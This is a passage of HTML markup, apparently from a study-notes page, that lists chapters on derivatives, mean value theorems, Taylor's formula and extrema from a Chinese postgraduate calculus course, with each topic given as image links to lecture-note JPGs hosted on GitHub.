src="https://github.com/starstarb/Postgraduate-Advanced-Mathematics/raw/master/%E9%AB%98%E7%AD%89%E6%95%B0%E5%AD%A6%20%E4%B8%8A%E5%86%8C%EF%BC%88%E5%90%8C%E6%B5%8E%E4%B8%83%E7%89%88%EF%BC%89%E6%B1%A4%E5%AE%B6%E5%87%A4%E7%B2%BE%E8%AE%B2/%E7%AC%AC%E4%BA%8C%E7%AB%A0%20%E5%AF%BC%E6%95%B0%E4%B8%8E%E5%BE%AE%E5%88%86/4.%E9%AB%98%E9%98%B6%E5%AF%BC%E6%95%B0/4%E9%AB%98%E9%98%B6%E5%AF%BC%E6%95%B0_3.jpg" alt="测试"><br><img src="https://github.com/starstarb/Postgraduate-Advanced-Mathematics/raw/master/%E9%AB%98%E7%AD%89%E6%95%B0%E5%AD%A6%20%E4%B8%8A%E5%86%8C%EF%BC%88%E5%90%8C%E6%B5%8E%E4%B8%83%E7%89%88%EF%BC%89%E6%B1%A4%E5%AE%B6%E5%87%A4%E7%B2%BE%E8%AE%B2/%E7%AC%AC%E4%BA%8C%E7%AB%A0%20%E5%AF%BC%E6%95%B0%E4%B8%8E%E5%BE%AE%E5%88%86/4.%E9%AB%98%E9%98%B6%E5%AF%BC%E6%95%B0/4%E9%AB%98%E9%98%B6%E5%AF%BC%E6%95%B0_4.jpg" alt="测试">    </p>  </li>  <li>    <p>隐函数及由参数方程确定的函数求导<br><img src="https://github.com/starstarb/Postgraduate-Advanced-Mathematics/raw/master/%E9%AB%98%E7%AD%89%E6%95%B0%E5%AD%A6%20%E4%B8%8A%E5%86%8C%EF%BC%88%E5%90%8C%E6%B5%8E%E4%B8%83%E7%89%88%EF%BC%89%E6%B1%A4%E5%AE%B6%E5%87%A4%E7%B2%BE%E8%AE%B2/%E7%AC%AC%E4%BA%8C%E7%AB%A0%20%E5%AF%BC%E6%95%B0%E4%B8%8E%E5%BE%AE%E5%88%86/5.%E9%9A%90%E5%87%BD%E6%95%B0%E5%8F%8A%E7%94%B1%E5%8F%82%E6%95%B0%E6%96%B9%E7%A8%8B%E7%A1%AE%E5%AE%9A%E7%9A%84%E5%87%BD%E6%95%B0%E6%B1%82%E5%AF%BC/5%E9%9A%90%E5%87%BD%E6%95%B0%E5%8F%8A%E7%94%B1%E5%8F%82%E6%95%B0%E6%96%B9%E7%A8%8B%E7%A1%AE%E5%AE%9A%E7%9A%84%E5%87%BD%E6%95%B0%E6%B1%82%E5%AF%BC_1.jpg" alt="测试"><br><img src="https://github.com/starstarb/Postgraduate-Advanced-Mathematics/raw/master/%E9%AB%98%E7%AD%89%E6%95%B0%E5%AD%A6%20%E4%B8%8A%E5%86%8C%EF%BC%88%E5%90%8C%E6%B5%8E%E4%B8%83%E7%89%88%EF%BC%89%E6%B1%A4%E5%AE%B6%E5%87%A4%E7%B2%BE%E8%AE%B2/%E7%AC%AC%E4%BA%8C%E7%AB%A0%20%E5%AF%BC%E6%95%B0%E4%B8%8E%E5%BE%AE%E5%88%86/5.%E9%9A%90%E5%87%BD%E6%95%B0%E5%8F%8A%E7%94%B1%E5%8F%82%E6%95%B0%E6%96%B9%E7%A8%8B%E7%A1%AE%E5%AE%9A%E7%9A%84%E5%87%BD%E6%95%B0%E6%B1%82%E5%AF%BC/5%E9%9A%90%E5%87%BD%E6%95%B0%E5%8F%8A%E7%94%B1%E5%8F%82%E6%95%B0%E6%96%B9%E7%A8%8B%E7%A1%AE%E5%AE%9A%E7%9A%84%E5%87%BD%E6%95%B0%E6%B1%82%E5%AF%BC_2.jpg" alt="测试"><br><img src="https://github.com/starstarb/Postgraduate-Advanced-Mathematics/raw/master/%E9%AB%98%E7%AD%89%E6%95%B0%E5%AD%A6%20%E4%B8%8A%E5%86%8C%EF%BC%88%E5%90%8C%E6%B5%8E%E4%B8%83%E7%89%88%EF%BC%89%E6%B1%A4%E5%AE%B6%E5%87%A4%E7%B2%BE%E8%AE%B2/%E7%AC%AC%E4%BA%8C%E7%AB%A0%20%E5%AF%BC%E6%95%B0%E4%B8%8E%E5%BE%AE%E5%88%86/5.%E9%9A%90%E5%87%BD%E6%95%B0%E5%8F%8A%E7%94%B1%E5%8F%82%E6%95%B0%E6%96%B9%E7%A8%8B%E7%A1%AE%E5%AE%9A%E7%9A%84%E5%87%BD%E6%95%B0%E6%B1%82%E5%AF%BC/5%E9%9A%90%E5%87%BD%E6%95%B0%E5%8F%8A%E7%94%B1%E5%8F%82%E6%95%B0%E6%96%B9%E7%A8%8B%E7%A1%AE%E5%AE%9A%E7%9A%84%E5%87%BD%E6%95%B0%E6%B1%82%E5%AF%BC_3.jpg" alt="测试">    </p>  </li>  <li>    <p>微分<br><img src="https://github.com/starstarb/Postgraduate-Advanced-Mathematics/raw/master/%E9%AB%98%E7%AD%89%E6%95%B0%E5%AD%A6%20%E4%B8%8A%E5%86%8C%EF%BC%88%E5%90%8C%E6%B5%8E%E4%B8%83%E7%89%88%EF%BC%89%E6%B1%A4%E5%AE%B6%E5%87%A4%E7%B2%BE%E8%AE%B2/%E7%AC%AC%E4%BA%8C%E7%AB%A0%20%E5%AF%BC%E6%95%B0%E4%B8%8E%E5%BE%AE%E5%88%86/6.%E5%BE%AE%E5%88%86/6%E5%BE%AE%E5%88%86_1.jpg" alt="测试"><br><img src="https://github.com/starstarb/Postgraduate-Advanced-Mathematics/raw/master/%E9%AB%98%E7%AD%89%E6%95%B0%E5%AD%A6%20%E4%B8%8A%E5%86%8C%EF%BC%88%E5%90%8C%E6%B5%8E%E4%B8%83%E7%89%88%EF%BC%89%E6%B1%A4%E5%AE%B6%E5%87%A4%E7%B2%BE%E8%AE%B2/%E7%AC%AC%E4%BA%8C%E7%AB%A0%20%E5%AF%BC%E6%95%B0%E4%B8%8E%E5%BE%AE%E5%88%86/6.%E5%BE%AE%E5%88%86/6%E5%BE%AE%E5%88%86_2.jpg" alt="测试"><br><img src="https://github.com/starstarb/Postgraduate-Advanced-Mathematics/raw/master/%E9%AB%98%E7%AD%89%E6%95%B0%E5%AD%A6%20%E4%B8%8A%E5%86%8C%EF%BC%88%E5%90%8C%E6%B5%8E%E4%B8%83%E7%89%88%EF%BC%89%E6%B1%A4%E5%AE%B6%E5%87%A4%E7%B2%BE%E8%AE%B2/%E7%AC%AC%E4%BA%8C%E7%AB%A0%20%E5%AF%BC%E6%95%B0%E4%B8%8E%E5%BE%AE%E5%88%86/6.%E5%BE%AE%E5%88%86/6%E5%BE%AE%E5%88%86_3.jpg" alt="测试"><br><img src="https://github.com/starstarb/Postgraduate-Advanced-Mathematics/raw/master/%E9%AB%98%E7%AD%89%E6%95%B0%E5%AD%A6%20%E4%B8%8A%E5%86%8C%EF%BC%88%E5%90%8C%E6%B5%8E%E4%B8%83%E7%89%88%EF%BC%89%E6%B1%A4%E5%AE%B6%E5%87%A4%E7%B2%BE%E8%AE%B2/%E7%AC%AC%E4%BA%8C%E7%AB%A0%20%E5%AF%BC%E6%95%B0%E4%B8%8E%E5%BE%AE%E5%88%86/6.%E5%BE%AE%E5%88%86/6%E5%BE%AE%E5%88%86_4.jpg" alt="测试"><br><img src="https://github.com/starstarb/Postgraduate-Advanced-Mathematics/raw/master/%E9%AB%98%E7%AD%89%E6%95%B0%E5%AD%A6%20%E4%B8%8A%E5%86%8C%EF%BC%88%E5%90%8C%E6%B5%8E%E4%B8%83%E7%89%88%EF%BC%89%E6%B1%A4%E5%AE%B6%E5%87%A4%E7%B2%BE%E8%AE%B2/%E7%AC%AC%E4%BA%8C%E7%AB%A0%20%E5%AF%BC%E6%95%B0%E4%B8%8E%E5%BE%AE%E5%88%86/6.%E5%BE%AE%E5%88%86/6%E5%BE%AE%E5%88%86_5.jpg" alt="测试"><br><img src="https://github.com/starstarb/Postgraduate-Advanced-Mathematics/raw/master/%E9%AB%98%E7%AD%89%E6%95%B0%E5%AD%A6%20%E4%B8%8A%E5%86%8C%EF%BC%88%E5%90%8C%E6%B5%8E%E4%B8%83%E7%89%88%EF%BC%89%E6%B1%A4%E5%AE%B6%E5%87%A4%E7%B2%BE%E8%AE%B2/%E7%AC%AC%E4%BA%8C%E7%AB%A0%20%E5%AF%BC%E6%95%B0%E4%B8%8E%E5%BE%AE%E5%88%86/6.%E5%BE%AE%E5%88%86/6%E5%BE%AE%E5%88%86_6.jpg" alt="测试">    </p>  </li></ol><h3 id="第三章-微分中值定理及导数的应用"><a href="#第三章-微分中值定理及导数的应用" class="headerlink" title="第三章 微分中值定理及导数的应用"></a>第三章  微分中值定理及导数的应用</h3><ol>  <li>微分中值定理(一)<br><img src="https://github.com/starstarb/Postgraduate-Advanced-Mathematics/raw/master/%E9%AB%98%E7%AD%89%E6%95%B0%E5%AD%A6%20%E4%B8%8A%E5%86%8C%EF%BC%88%E5%90%8C%E6%B5%8E%E4%B8%83%E7%89%88%EF%BC%89%E6%B1%A4%E5%AE%B6%E5%87%A4%E7%B2%BE%E8%AE%B2/%E7%AC%AC%E4%B8%89%E7%AB%A0%20%E5%BE%AE%E5%88%86%E4%B8%AD%E5%80%BC%E5%AE%9A%E7%90%86%E5%8F%8A%E5%AF%BC%E6%95%B0%E7%9A%84%E5%BA%94%E7%94%A8/1.%E5%BE%AE%E5%88%86%E4%B8%AD%E5%80%BC%E5%AE%9A%E7%90%86%EF%BC%88%E4%B8%80%EF%BC%89/1%E5%BE%AE%E5%88%86%E4%B8%AD%E5%80%BC%E5%AE%9A%E7%90%86(%E4%B8%80)_1.jpg" alt="测试">_    <img src="https://github.com/starstarb/Postgraduate-Advanced-Mathematics/raw/master/%E9%AB%98%E7%AD%89%E6%95%B0%E5%AD%A6%20%E4%B8%8A%E5%86%8C%EF%BC%88%E5%90%8C%E6%B5%8E%E4%B8%83%E7%89%88%EF%BC%89%E6%B1%A4%E5%AE%B6%E5%87%A4%E7%B2%BE%E8%AE%B2/%E7%AC%AC%E4%B8%89%E7%AB%A0%20%E5%BE%AE%E5%88%86%E4%B8%AD%E5%80%BC%E5%AE%9A%E7%90%86%E5%8F%8A%E5%AF%BC%E6%95%B0%E7%9A%84%E5%BA%94%E7%94%A8/1.%E5%BE%AE%E5%88%86%E4%B8%AD%E5%80%BC%E5%AE%9A%E7%90%86%EF%BC%88%E4%B8%80%EF%BC%89/1%E5%BE%AE%E5%88%86%E4%B8%AD%E5%80%BC%E5%AE%9A%E7%90%86(%E4%B8%80)_2.jpg" alt="测试">_  </li></ol><p><img src="https://github.com/starstarb/Postgraduate-Advanced-Mathematics/raw/master/%E9%AB%98%E7%AD%89%E6%95%B0%E5%AD%A6%20%E4%B8%8A%E5%86%8C%EF%BC%88%E5%90%8C%E6%B5%8E%E4%B8%83%E7%89%88%EF%BC%89%E6%B1%A4%E5%AE%B6%E5%87%A4%E7%B2%BE%E8%AE%B2/%E7%AC%AC%E4%B8%89%E7%AB%A0%20%E5%BE%AE%E5%88%86%E4%B8%AD%E5%80%BC%E5%AE%9A%E7%90%86%E5%8F%8A%E5%AF%BC%E6%95%B0%E7%9A%84%E5%BA%94%E7%94%A8/1.%E5%BE%AE%E5%88%86%E4%B8%AD%E5%80%BC%E5%AE%9A%E7%90%86%EF%BC%88%E4%B8%80%EF%BC%89/1%E5%BE%AE%E5%88%86%E4%B8%AD%E5%80%BC%E5%AE%9A%E7%90%86(%E4%B8%80)_3.jpg" alt="测试">_</p><ol start="2">  <li>    <p>微分中值定理(二)<br><img src="https://github.com/starstarb/Postgraduate-Advanced-Mathematics/raw/master/%E9%AB%98%E7%AD%89%E6%95%B0%E5%AD%A6%20%E4%B8%8A%E5%86%8C%EF%BC%88%E5%90%8C%E6%B5%8E%E4%B8%83%E7%89%88%EF%BC%89%E6%B1%A4%E5%AE%B6%E5%87%A4%E7%B2%BE%E8%AE%B2/%E7%AC%AC%E4%B8%89%E7%AB%A0%20%E5%BE%AE%E5%88%86%E4%B8%AD%E5%80%BC%E5%AE%9A%E7%90%86%E5%8F%8A%E5%AF%BC%E6%95%B0%E7%9A%84%E5%BA%94%E7%94%A8/2.%E5%BE%AE%E5%88%86%E4%B8%AD%E5%80%BC%E5%AE%9A%E7%90%86%EF%BC%88%E4%BA%8C%EF%BC%89/2%E5%BE%AE%E5%88%86%E4%B8%AD%E5%80%BC%E5%AE%9A%E7%90%86(%E4%BA%8C)_1.jpg" alt="测试">_      <img src="https://github.com/starstarb/Postgraduate-Advanced-Mathematics/raw/master/%E9%AB%98%E7%AD%89%E6%95%B0%E5%AD%A6%20%E4%B8%8A%E5%86%8C%EF%BC%88%E5%90%8C%E6%B5%8E%E4%B8%83%E7%89%88%EF%BC%89%E6%B1%A4%E5%AE%B6%E5%87%A4%E7%B2%BE%E8%AE%B2/%E7%AC%AC%E4%B8%89%E7%AB%A0%20%E5%BE%AE%E5%88%86%E4%B8%AD%E5%80%BC%E5%AE%9A%E7%90%86%E5%8F%8A%E5%AF%BC%E6%95%B0%E7%9A%84%E5%BA%94%E7%94%A8/2.%E5%BE%AE%E5%88%86%E4%B8%AD%E5%80%BC%E5%AE%9A%E7%90%86%EF%BC%88%E4%BA%8C%EF%BC%89/2%E5%BE%AE%E5%88%86%E4%B8%AD%E5%80%BC%E5%AE%9A%E7%90%86(%E4%BA%8C)_2.jpg" alt="测试">_      <img src="https://github.com/starstarb/Postgraduate-Advanced-Mathematics/raw/master/%E9%AB%98%E7%AD%89%E6%95%B0%E5%AD%A6%20%E4%B8%8A%E5%86%8C%EF%BC%88%E5%90%8C%E6%B5%8E%E4%B8%83%E7%89%88%EF%BC%89%E6%B1%A4%E5%AE%B6%E5%87%A4%E7%B2%BE%E8%AE%B2/%E7%AC%AC%E4%B8%89%E7%AB%A0%20%E5%BE%AE%E5%88%86%E4%B8%AD%E5%80%BC%E5%AE%9A%E7%90%86%E5%8F%8A%E5%AF%BC%E6%95%B0%E7%9A%84%E5%BA%94%E7%94%A8/2.%E5%BE%AE%E5%88%86%E4%B8%AD%E5%80%BC%E5%AE%9A%E7%90%86%EF%BC%88%E4%BA%8C%EF%BC%89/2%E5%BE%AE%E5%88%86%E4%B8%AD%E5%80%BC%E5%AE%9A%E7%90%86(%E4%BA%8C)_3.jpg" alt="测试">_      <img src="https://github.com/starstarb/Postgraduate-Advanced-Mathematics/raw/master/%E9%AB%98%E7%AD%89%E6%95%B0%E5%AD%A6%20%E4%B8%8A%E5%86%8C%EF%BC%88%E5%90%8C%E6%B5%8E%E4%B8%83%E7%89%88%EF%BC%89%E6%B1%A4%E5%AE%B6%E5%87%A4%E7%B2%BE%E8%AE%B2/%E7%AC%AC%E4%B8%89%E7%AB%A0%20%E5%BE%AE%E5%88%86%E4%B8%AD%E5%80%BC%E5%AE%9A%E7%90%86%E5%8F%8A%E5%AF%BC%E6%95%B0%E7%9A%84%E5%BA%94%E7%94%A8/2.%E5%BE%AE%E5%88%86%E4%B8%AD%E5%80%BC%E5%AE%9A%E7%90%86%EF%BC%88%E4%BA%8C%EF%BC%89/2%E5%BE%AE%E5%88%86%E4%B8%AD%E5%80%BC%E5%AE%9A%E7%90%86(%E4%BA%8C)_4.jpg" alt="测试">_    </p>  </li>  <li>    <p>洛必达法则<br><img src="https://github.com/starstarb/Postgraduate-Advanced-Mathematics/raw/master/%E9%AB%98%E7%AD%89%E6%95%B0%E5%AD%A6%20%E4%B8%8A%E5%86%8C%EF%BC%88%E5%90%8C%E6%B5%8E%E4%B8%83%E7%89%88%EF%BC%89%E6%B1%A4%E5%AE%B6%E5%87%A4%E7%B2%BE%E8%AE%B2/%E7%AC%AC%E4%B8%89%E7%AB%A0%20%E5%BE%AE%E5%88%86%E4%B8%AD%E5%80%BC%E5%AE%9A%E7%90%86%E5%8F%8A%E5%AF%BC%E6%95%B0%E7%9A%84%E5%BA%94%E7%94%A8/3.%E6%B4%9B%E5%BF%85%E8%BE%BE%E6%B3%95%E5%88%99/3%E6%B4%9B%E5%BF%85%E8%BE%BE%E6%B3%95%E5%88%99_1.jpg" alt="测试">    </p>  </li></ol><p><img src="https://github.com/starstarb/Postgraduate-Advanced-Mathematics/raw/master/%E9%AB%98%E7%AD%89%E6%95%B0%E5%AD%A6%20%E4%B8%8A%E5%86%8C%EF%BC%88%E5%90%8C%E6%B5%8E%E4%B8%83%E7%89%88%EF%BC%89%E6%B1%A4%E5%AE%B6%E5%87%A4%E7%B2%BE%E8%AE%B2/%E7%AC%AC%E4%B8%89%E7%AB%A0%20%E5%BE%AE%E5%88%86%E4%B8%AD%E5%80%BC%E5%AE%9A%E7%90%86%E5%8F%8A%E5%AF%BC%E6%95%B0%E7%9A%84%E5%BA%94%E7%94%A8/3.%E6%B4%9B%E5%BF%85%E8%BE%BE%E6%B3%95%E5%88%99/3%E6%B4%9B%E5%BF%85%E8%BE%BE%E6%B3%95%E5%88%99_2.jpg" alt="测试"><br><img src="https://github.com/starstarb/Postgraduate-Advanced-Mathematics/raw/master/%E9%AB%98%E7%AD%89%E6%95%B0%E5%AD%A6%20%E4%B8%8A%E5%86%8C%EF%BC%88%E5%90%8C%E6%B5%8E%E4%B8%83%E7%89%88%EF%BC%89%E6%B1%A4%E5%AE%B6%E5%87%A4%E7%B2%BE%E8%AE%B2/%E7%AC%AC%E4%B8%89%E7%AB%A0%20%E5%BE%AE%E5%88%86%E4%B8%AD%E5%80%BC%E5%AE%9A%E7%90%86%E5%8F%8A%E5%AF%BC%E6%95%B0%E7%9A%84%E5%BA%94%E7%94%A8/3.%E6%B4%9B%E5%BF%85%E8%BE%BE%E6%B3%95%E5%88%99/3%E6%B4%9B%E5%BF%85%E8%BE%BE%E6%B3%95%E5%88%99_3.jpg" alt="测试"></p><ol start="4">  <li>    <p>Taylor公式<br><img src="https://github.com/starstarb/Postgraduate-Advanced-Mathematics/raw/master/%E9%AB%98%E7%AD%89%E6%95%B0%E5%AD%A6%20%E4%B8%8A%E5%86%8C%EF%BC%88%E5%90%8C%E6%B5%8E%E4%B8%83%E7%89%88%EF%BC%89%E6%B1%A4%E5%AE%B6%E5%87%A4%E7%B2%BE%E8%AE%B2/%E7%AC%AC%E4%B8%89%E7%AB%A0%20%E5%BE%AE%E5%88%86%E4%B8%AD%E5%80%BC%E5%AE%9A%E7%90%86%E5%8F%8A%E5%AF%BC%E6%95%B0%E7%9A%84%E5%BA%94%E7%94%A8/4.Taylor%E5%85%AC%E5%BC%8F/4%E6%B3%B0%E5%8B%92%E5%85%AC%E5%BC%8F_1.jpg" alt="测试"><br><img src="https://github.com/starstarb/Postgraduate-Advanced-Mathematics/raw/master/%E9%AB%98%E7%AD%89%E6%95%B0%E5%AD%A6%20%E4%B8%8A%E5%86%8C%EF%BC%88%E5%90%8C%E6%B5%8E%E4%B8%83%E7%89%88%EF%BC%89%E6%B1%A4%E5%AE%B6%E5%87%A4%E7%B2%BE%E8%AE%B2/%E7%AC%AC%E4%B8%89%E7%AB%A0%20%E5%BE%AE%E5%88%86%E4%B8%AD%E5%80%BC%E5%AE%9A%E7%90%86%E5%8F%8A%E5%AF%BC%E6%95%B0%E7%9A%84%E5%BA%94%E7%94%A8/4.Taylor%E5%85%AC%E5%BC%8F/4%E6%B3%B0%E5%8B%92%E5%85%AC%E5%BC%8F_2.jpg" alt="测试"><br><img src="https://github.com/starstarb/Postgraduate-Advanced-Mathematics/raw/master/%E9%AB%98%E7%AD%89%E6%95%B0%E5%AD%A6%20%E4%B8%8A%E5%86%8C%EF%BC%88%E5%90%8C%E6%B5%8E%E4%B8%83%E7%89%88%EF%BC%89%E6%B1%A4%E5%AE%B6%E5%87%A4%E7%B2%BE%E8%AE%B2/%E7%AC%AC%E4%B8%89%E7%AB%A0%20%E5%BE%AE%E5%88%86%E4%B8%AD%E5%80%BC%E5%AE%9A%E7%90%86%E5%8F%8A%E5%AF%BC%E6%95%B0%E7%9A%84%E5%BA%94%E7%94%A8/4.Taylor%E5%85%AC%E5%BC%8F/4%E6%B3%B0%E5%8B%92%E5%85%AC%E5%BC%8F_3.jpg" alt="测试"><br><img src="https://github.com/starstarb/Postgraduate-Advanced-Mathematics/raw/master/%E9%AB%98%E7%AD%89%E6%95%B0%E5%AD%A6%20%E4%B8%8A%E5%86%8C%EF%BC%88%E5%90%8C%E6%B5%8E%E4%B8%83%E7%89%88%EF%BC%89%E6%B1%A4%E5%AE%B6%E5%87%A4%E7%B2%BE%E8%AE%B2/%E7%AC%AC%E4%B8%89%E7%AB%A0%20%E5%BE%AE%E5%88%86%E4%B8%AD%E5%80%BC%E5%AE%9A%E7%90%86%E5%8F%8A%E5%AF%BC%E6%95%B0%E7%9A%84%E5%BA%94%E7%94%A8/4.Taylor%E5%85%AC%E5%BC%8F/4%E6%B3%B0%E5%8B%92%E5%85%AC%E5%BC%8F_4.jpg" alt="测试">    </p>  </li>  <li>    <p>函数单调性与曲线凹凸性(一)<br><img src="https://github.com/starstarb/Postgraduate-Advanced-Mathematics/raw/master/%E9%AB%98%E7%AD%89%E6%95%B0%E5%AD%A6%20%E4%B8%8A%E5%86%8C%EF%BC%88%E5%90%8C%E6%B5%8E%E4%B8%83%E7%89%88%EF%BC%89%E6%B1%A4%E5%AE%B6%E5%87%A4%E7%B2%BE%E8%AE%B2/%E7%AC%AC%E4%B8%89%E7%AB%A0%20%E5%BE%AE%E5%88%86%E4%B8%AD%E5%80%BC%E5%AE%9A%E7%90%86%E5%8F%8A%E5%AF%BC%E6%95%B0%E7%9A%84%E5%BA%94%E7%94%A8/5.%E5%87%BD%E6%95%B0%E5%8D%95%E8%B0%83%E6%80%A7%E4%B8%8E%E6%9B%B2%E7%BA%BF%E5%87%B9%E5%87%B8%E6%80%A7%EF%BC%88%E4%B8%80%EF%BC%89/5%E5%87%BD%E6%95%B0%E5%8D%95%E8%B0%83%E6%80%A7%E4%B8%8E%E6%9B%B2%E7%BA%BF%E5%87%B9%E5%87%B8%E6%80%A7(%E4%B8%80)_1.jpg" alt="测试">_      <img src="https://github.com/starstarb/Postgraduate-Advanced-Mathematics/raw/master/%E9%AB%98%E7%AD%89%E6%95%B0%E5%AD%A6%20%E4%B8%8A%E5%86%8C%EF%BC%88%E5%90%8C%E6%B5%8E%E4%B8%83%E7%89%88%EF%BC%89%E6%B1%A4%E5%AE%B6%E5%87%A4%E7%B2%BE%E8%AE%B2/%E7%AC%AC%E4%B8%89%E7%AB%A0%20%E5%BE%AE%E5%88%86%E4%B8%AD%E5%80%BC%E5%AE%9A%E7%90%86%E5%8F%8A%E5%AF%BC%E6%95%B0%E7%9A%84%E5%BA%94%E7%94%A8/5.%E5%87%BD%E6%95%B0%E5%8D%95%E8%B0%83%E6%80%A7%E4%B8%8E%E6%9B%B2%E7%BA%BF%E5%87%B9%E5%87%B8%E6%80%A7%EF%BC%88%E4%B8%80%EF%BC%89/5%E5%87%BD%E6%95%B0%E5%8D%95%E8%B0%83%E6%80%A7%E4%B8%8E%E6%9B%B2%E7%BA%BF%E5%87%B9%E5%87%B8%E6%80%A7(%E4%B8%80)_2.jpg" alt="测试">_    </p>  </li>  <li>    <p>函数单调性与曲线凹凸性（二）<br><img src="https://github.com/starstarb/Postgraduate-Advanced-Mathematics/raw/master/%E9%AB%98%E7%AD%89%E6%95%B0%E5%AD%A6%20%E4%B8%8A%E5%86%8C%EF%BC%88%E5%90%8C%E6%B5%8E%E4%B8%83%E7%89%88%EF%BC%89%E6%B1%A4%E5%AE%B6%E5%87%A4%E7%B2%BE%E8%AE%B2/%E7%AC%AC%E4%B8%89%E7%AB%A0%20%E5%BE%AE%E5%88%86%E4%B8%AD%E5%80%BC%E5%AE%9A%E7%90%86%E5%8F%8A%E5%AF%BC%E6%95%B0%E7%9A%84%E5%BA%94%E7%94%A8/6.%E5%87%BD%E6%95%B0%E5%8D%95%E8%B0%83%E6%80%A7%E4%B8%8E%E6%9B%B2%E7%BA%BF%E5%87%B9%E5%87%B8%E6%80%A7%EF%BC%88%E4%BA%8C%EF%BC%89/6%E5%87%BD%E6%95%B0%E7%9A%84%E5%8D%95%E8%B0%83%E6%80%A7%E4%B8%8E%E6%9B%B2%E7%BA%BF%E5%87%B9%E5%87%B8%E6%80%A7(%E4%BA%8C)_1.jpg" alt="测试">_      <img src="https://github.com/starstarb/Postgraduate-Advanced-Mathematics/raw/master/%E9%AB%98%E7%AD%89%E6%95%B0%E5%AD%A6%20%E4%B8%8A%E5%86%8C%EF%BC%88%E5%90%8C%E6%B5%8E%E4%B8%83%E7%89%88%EF%BC%89%E6%B1%A4%E5%AE%B6%E5%87%A4%E7%B2%BE%E8%AE%B2/%E7%AC%AC%E4%B8%89%E7%AB%A0%20%E5%BE%AE%E5%88%86%E4%B8%AD%E5%80%BC%E5%AE%9A%E7%90%86%E5%8F%8A%E5%AF%BC%E6%95%B0%E7%9A%84%E5%BA%94%E7%94%A8/6.%E5%87%BD%E6%95%B0%E5%8D%95%E8%B0%83%E6%80%A7%E4%B8%8E%E6%9B%B2%E7%BA%BF%E5%87%B9%E5%87%B8%E6%80%A7%EF%BC%88%E4%BA%8C%EF%BC%89/6%E5%87%BD%E6%95%B0%E7%9A%84%E5%8D%95%E8%B0%83%E6%80%A7%E4%B8%8E%E6%9B%B2%E7%BA%BF%E5%87%B9%E5%87%B8%E6%80%A7(%E4%BA%8C)_2.jpg" alt="测试">_      <img src="https://github.com/starstarb/Postgraduate-Advanced-Mathematics/raw/master/%E9%AB%98%E7%AD%89%E6%95%B0%E5%AD%A6%20%E4%B8%8A%E5%86%8C%EF%BC%88%E5%90%8C%E6%B5%8E%E4%B8%83%E7%89%88%EF%BC%89%E6%B1%A4%E5%AE%B6%E5%87%A4%E7%B2%BE%E8%AE%B2/%E7%AC%AC%E4%B8%89%E7%AB%A0%20%E5%BE%AE%E5%88%86%E4%B8%AD%E5%80%BC%E5%AE%9A%E7%90%86%E5%8F%8A%E5%AF%BC%E6%95%B0%E7%9A%84%E5%BA%94%E7%94%A8/6.%E5%87%BD%E6%95%B0%E5%8D%95%E8%B0%83%E6%80%A7%E4%B8%8E%E6%9B%B2%E7%BA%BF%E5%87%B9%E5%87%B8%E6%80%A7%EF%BC%88%E4%BA%8C%EF%BC%89/6%E5%87%BD%E6%95%B0%E7%9A%84%E5%8D%95%E8%B0%83%E6%80%A7%E4%B8%8E%E6%9B%B2%E7%BA%BF%E5%87%B9%E5%87%B8%E6%80%A7(%E4%BA%8C)_3.jpg" alt="测试">_    </p>  </li>  <li>    <p>极值与最值<br><img src="https://github.com/starstarb/Postgraduate-Advanced-Mathematics/raw/master/%E9%AB%98%E7%AD%89%E6%95%B0%E5%AD%A6%20%E4%B8%8A%E5%86%8C%EF%BC%88%E5%90%8C%E6%B5%8E%E4%B8%83%E7%89%88%EF%BC%89%E6%B1%A4%E5%AE%B6%E5%87%A4%E7%B2%BE%E8%AE%B2/%E7%AC%AC%E4%B8%89%E7%AB%A0%20%E5%BE%AE%E5%88%86%E4%B8%AD%E5%80%BC%E5%AE%9A%E7%90%86%E5%8F%8A%E5%AF%BC%E6%95%B0%E7%9A%84%E5%BA%94%E7%94%A8/7.%E6%9E%81%E5%80%BC%E4%B8%8E%E6%9C%80%E5%80%BC/7%E6%9E%81%E5%80%BC%E4%B8%8E%E6%9C%80%E5%80%BC_1.jpg" alt="测试"><br><img src="https://github.com/starstarb/Postgraduate-Advanced-Mathematics/raw/master/%E9%AB%98%E7%AD%89%E6%95%B0%E5%AD%A6%20%E4%B8%8A%E5%86%8C%EF%BC%88%E5%90%8C%E6%B5%8E%E4%B8%83%E7%89%88%EF%BC%89%E6%B1%A4%E5%AE%B6%E5%87%A4%E7%B2%BE%E8%AE%B2/%E7%AC%AC%E4%B8%89%E7%AB%A0%20%E5%BE%AE%E5%88%86%E4%B8%AD%E5%80%BC%E5%AE%9A%E7%90%86%E5%8F%8A%E5%AF%BC%E6%95%B0%E7%9A%84%E5%BA%94%E7%94%A8/7.%E6%9E%81%E5%80%BC%E4%B8%8E%E6%9C%80%E5%80%BC/7%E6%9E%81%E5%80%BC%E4%B8%8E%E6%9C%80%E5%80%BC_2.jpg" alt="测试"><br><img src="https://github.com/starstarb/Postgraduate-Advanced-Mathematics/raw/master/%E9%AB%98%E7%AD%89%E6%95%B0%E5%AD%A6%20%E4%B8%8A%E5%86%8C%EF%BC%88%E5%90%8C%E6%B5%8E%E4%B8%83%E7%89%88%EF%BC%89%E6%B1%A4%E5%AE%B6%E5%87%A4%E7%B2%BE%E8%AE%B2/%E7%AC%AC%E4%B8%89%E7%AB%A0%20%E5%BE%AE%E5%88%86%E4%B8%AD%E5%80%BC%E5%AE%9A%E7%90%86%E5%8F%8A%E5%AF%BC%E6%95%B0%E7%9A%84%E5%BA%94%E7%94%A8/7.%E6%9E%81%E5%80%BC%E4%B8%8E%E6%9C%80%E5%80%BC/7%E6%9E%81%E5%80%BC%E4%B8%8E%E6%9C%80%E5%80%BC_3.jpg" alt="测试"><br><img src="https://github.com/starstarb/Postgraduate-Advanced-Mathematics/raw/master/%E9%AB%98%E7%AD%89%E6%95%B0%E5%AD%A6%20%E4%B8%8A%E5%86%8C%EF%BC%88%E5%90%8C%E6%B5%8E%E4%B8%83%E7%89%88%EF%BC%89%E6%B1%A4%E5%AE%B6%E5%87%A4%E7%B2%BE%E8%AE%B2/%E7%AC%AC%E4%B8%89%E7%AB%A0%20%E5%BE%AE%E5%88%86%E4%B8%AD%E5%80%BC%E5%AE%9A%E7%90%86%E5%8F%8A%E5%AF%BC%E6%95%B0%E7%9A%84%E5%BA%94%E7%94%A8/7.%E6%9E%81%E5%80%BC%E4%B8%8E%E6%9C%80%E5%80%BC/7%E6%9E%81%E5%80%BC%E4%B8%8E%E6%9C%80%E5%80%BC_4.jpg" alt="测试"><br><img 